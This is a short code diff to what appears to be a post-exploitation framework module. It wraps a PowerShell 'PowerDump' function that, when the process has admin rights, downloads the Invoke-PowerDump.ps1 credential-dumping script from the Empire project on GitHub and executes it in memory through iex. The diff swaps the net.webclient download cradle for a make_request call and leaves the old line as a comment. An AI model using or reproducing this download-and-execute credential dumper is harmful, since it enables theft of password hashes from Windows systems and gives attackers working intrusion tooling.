@@ -21,7 +21,8 @@ class CustomModule(Module):
     def run_module(self):
         function = """function PowerDump{
             if (isadmin){
-                iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1');
+                (make_request -URL https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1) | iex
+                #iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1');
                 Invoke-PowerDump;
             }else {
                 return 'No admin privileges';
